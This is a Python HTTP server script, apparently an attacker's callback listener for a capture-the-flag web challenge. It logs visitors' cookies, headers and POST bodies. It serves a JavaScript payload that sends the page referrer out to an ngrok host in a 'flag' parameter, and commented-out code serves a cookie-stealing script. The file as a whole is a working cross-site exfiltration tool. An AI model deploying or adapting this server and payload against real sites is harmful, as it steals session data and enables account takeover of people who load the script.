from http.server import BaseHTTPRequestHandler, HTTPServer

class Server(BaseHTTPRequestHandler):
    def do_GET(self):
        if (self.path == "/quote"):
            print("COOKIES:\n", self.headers['Cookie'])
            print(f"Path: {self.path}")
            print(f"Headers: {self.headers}")
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Referer', '127.0.0.1')
            self.send_header('Origin', '127.0.0.1')
            self.send_header('X-Forwarded-Host', '127.0.0.1')
            self.end_headers()
            with open("serve/aled.html", "rb") as file:
                self.wfile.write(file.read())
            print(f"[!] Quote downloaded!")
            return

        print("COOKIES:\n", self.headers['Cookie'])
        print("headers:\n", self.headers)
        print("URL:\n", self.path)
        js_code = '''
        var cookies = document.cookie;
        fetch(`https://https://ec6f-109-138-53-168.ngrok-free.app?flag=${encodeURIComponent(document.referrer)}`, {
            method: 'GET',
        })
        '''
        self.send_response(200)
        self.send_header('Content-type', 'application/javascript')
        self.end_headers()
        self.wfile.write(js_code.encode('utf-8'))


        # if (self.path == "/csteal"):
        #     print("COOKIES:\n", self.headers['Cookie'])
        #     print(f"Path: {self.path}")
        #     print(f"Headers: {self.headers}")
        #     self.send_response(200)
        #     self.send_header('Content-type', 'application/javascript')
        #     self.end_headers()
        #     with open("serve/csteal.js", "rb") as file:
        #         self.wfile.write(file.read())
        #     return


        # print(f"Path: {self.path}")
        # print(f"Headers: {self.headers}")
        # # self.send_response(200)
        # # self.end_headers()

        # # print("COOKIES:\n", self.headers['Cookie'])
        # # print("headers:\n", self.headers)
        # # print("URL:\n", self.path)
        # # js_code = '''

        # # '''
        # self.send_response(200)
        # # self.send_header('Content-type', 'application/javascript')
        # self.end_headers()
        # # self.wfile.write(js_code.encode('utf-8'))

    def do_POST(self):
        print(f"Path: {self.path}")
        print(f"Headers: {self.headers}")
        print(f"Content-Length: {self.headers['Content-Length']}")
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print(f"POST data: {post_data}")
        self.send_response(200)
        self.end_headers()


def run(server_class=HTTPServer, handler_class=Server, port=8082):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"Starting server on port {port}...\n")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    print("Stopping server...\n")

if __name__ == '__main__':
    run()
